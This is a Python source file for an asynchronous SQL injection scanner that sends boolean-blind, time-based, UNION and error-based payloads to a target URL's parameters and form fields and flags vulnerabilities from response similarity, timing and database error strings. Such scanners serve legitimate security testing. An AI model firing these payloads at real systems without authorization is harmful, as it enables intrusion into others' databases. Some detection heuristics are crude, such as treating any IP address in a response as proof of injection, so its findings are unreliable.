"""
SQL Injection Scanner - Specialized scanner for SQL injection vulnerabilities
"""

import asyncio
import aiohttp
import re
from typing import List, Optional, Dict, Any
from dataclasses import dataclass

from ...core.logger import Logger


@dataclass
class SQLInjectionResult:
    """Result of SQL injection test."""
    url: str
    parameter: str
    payload: str
    injection_type: str  # boolean, time-based, union, error-based
    is_vulnerable: bool
    database: Optional[str] = None


class SQLInjectionScanner:
    """
    Specialized SQL injection scanner with multiple detection techniques.

    Supports:
    - Boolean-based blind SQL injection
    - Time-based blind SQL injection
    - Union-based SQL injection
    - Error-based SQL injection
    """

    # SQL injection payloads by type
    PAYLOADS = {
        "boolean_blind": [
            "' AND 1=1--",
            "' AND 1=2--",
            "' OR 1=1--",
            "') AND 1=1--",
            "') OR 1=1--",
        ],
        "time_based": [
            "'; SELECT SLEEP(5)--",
            "'; WAITFOR DELAY '00:00:05'--",
            "'; pg_sleep(5)--",
            "'; SELECT BENCHMARK(5000000,MD5('test'))--",
        ],
        "union_based": [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION ALL SELECT NULL--",
            "' UNION ALL SELECT NULL,NULL--",
        ],
        "error_based": [
            "'; EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
            "'; UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",
        ]
    }

    def __init__(
        self,
        target_url: str,
        timeout: int = 30,
        delay: float = 1.0
    ):
        """
        Initialize SQL injection scanner.

        Args:
            target_url: Target URL to test
            timeout: Request timeout in seconds
            delay: Delay for time-based tests in seconds
        """
        self.target_url = target_url
        self.timeout = timeout
        self.delay = delay
        self.logger = Logger.get_logger("sqli_scanner")

    async def scan_parameter(self, param_name: str, param_value: str = "test") -> List[SQLInjectionResult]:
        """
        Scan a specific parameter for SQL injection.

        Args:
            param_name: Parameter name to test
            param_value: Original parameter value

        Returns:
            List of SQL injection findings
        """
        results = []

        # Test each injection type
        for injection_type, payloads in self.PAYLOADS.items():
            for payload in payloads:
                result = await self._test_injection(param_name, param_value, payload, injection_type)
                if result and result.is_vulnerable:
                    results.append(result)

        return results

    async def _test_injection(
        self,
        param_name: str,
        param_value: str,
        payload: str,
        injection_type: str
    ) -> Optional[SQLInjectionResult]:
        """Test a specific payload."""
        try:
            params = {param_name: param_value}
            test_params = {param_name: payload}

            async with aiohttp.ClientSession() as session:
                # Send original request for baseline
                async with session.get(self.target_url, params=params, timeout=self.timeout) as original:
                    original_status = original.status
                    original_content = await original.text()

                # Send payload request
                async with session.get(self.target_url, params=test_params, timeout=self.timeout) as response:
                    content = await response.text()

            # Analyze response based on injection type
            is_vulnerable = False
            database = None

            if injection_type == "boolean_blind":
                is_vulnerable = self._analyze_boolean_response(
                    original_content, content, payload
                )
            elif injection_type == "time_based":
                is_vulnerable = await self._analyze_time_response(
                    param_name, param_value, payload
                )
            elif injection_type == "union_based":
                is_vulnerable, database = self._analyze_union_response(content)
            elif injection_type == "error_based":
                is_vulnerable, database = self._analyze_error_response(content)

            if is_vulnerable:
                return SQLInjectionResult(
                    url=self.target_url,
                    parameter=param_name,
                    payload=payload,
                    injection_type=injection_type,
                    is_vulnerable=True,
                    database=database
                )

        except Exception as e:
            self.logger.debug(f"SQL injection test failed: {e}")

        return None

    def _analyze_boolean_response(
        self,
        original: str,
        payload_response: str,
        payload: str
    ) -> bool:
        """Analyze boolean-based blind SQL injection response."""
        # If response changes when we inject 1=1 vs 1=2, it's vulnerable
        if "1=1" in payload.lower():
            # True condition - should show similar content to original
            similarity = self._calculate_similarity(original, payload_response)
            return similarity > 0.9
        elif "1=2" in payload.lower():
            # False condition - should show different content
            similarity = self._calculate_similarity(original, payload_response)
            return similarity < 0.5
        return False

    async def _analyze_time_response(
        self,
        param_name: str,
        param_value: str,
        payload: str
    ) -> bool:
        """Analyze time-based blind SQL injection response."""
        import time

        test_params = {param_name: payload}

        start = time.time()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(self.target_url, params=test_params, timeout=self.timeout + 5) as response:
                    await response.text()
            elapsed = time.time() - start
            return elapsed >= self.delay
        except:
            return False

    def _analyze_union_response(self, content: str) -> tuple:
        """Analyze union-based SQL injection response."""
        # Look for database error messages or data disclosure
        db_errors = [
            "mysql_fetch",
            "ora-",
            "postgresql",
            "sqlite3",
            "microsoft sql server",
        ]

        for error in db_errors:
            if error in content.lower():
                return True, error.split()[0] if error.split() else "Unknown"

        # Check for data in response that looks like database content
        if re.search(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b', content):  # IP address pattern
            return True, "Unknown"

        return False, None

    def _analyze_error_response(self, content: str) -> tuple:
        """Analyze error-based SQL injection response."""
        # Check for SQL error messages
        error_patterns = [
            r'you have an error in your sql syntax',
            r'unterminated',
            r'sqlite3\.OperationalError',
            r'ora-\d+:',
            r'postgresql.*?error',
            r'mysql.*?error',
        ]

        for pattern in error_patterns:
            match = re.search(pattern, content, re.I)
            if match:
                # Try to identify database type
                db_type = "Unknown"
                if "mysql" in content.lower():
                    db_type = "MySQL"
                elif "ora-" in content.lower():
                    db_type = "Oracle"
                elif "postgresql" in content.lower():
                    db_type = "PostgreSQL"
                elif "sqlite" in content.lower():
                    db_type = "SQLite"
                elif "sql server" in content.lower():
                    db_type = "MSSQL"

                return True, db_type

        return False, None

    def _calculate_similarity(self, str1: str, str2: str) -> float:
        """Calculate similarity ratio between two strings."""
        if not str1 or not str2:
            return 0.0

        # Simple Jaccard similarity based on words
        words1 = set(str1.lower().split())
        words2 = set(str2.lower().split())

        if not words1 or not words2:
            return 0.0

        intersection = len(words1 & words2)
        union = len(words1 | words2)

        return intersection / union if union > 0 else 0.0

    async def scan_form(self, form_data: Dict) -> List[SQLInjectionResult]:
        """
        Scan all parameters in a form for SQL injection.

        Args:
            form_data: Form information with action, method, and inputs

        Returns:
            List of SQL injection findings
        """
        results = []

        for input_field in form_data.get('inputs', []):
            if input_field.get('type') in ('text', 'search', 'email', 'password'):
                findings = await self.scan_parameter(
                    input_field['name'],
                    input_field.get('value', 'test')
                )
                results.extend(findings)

        return results
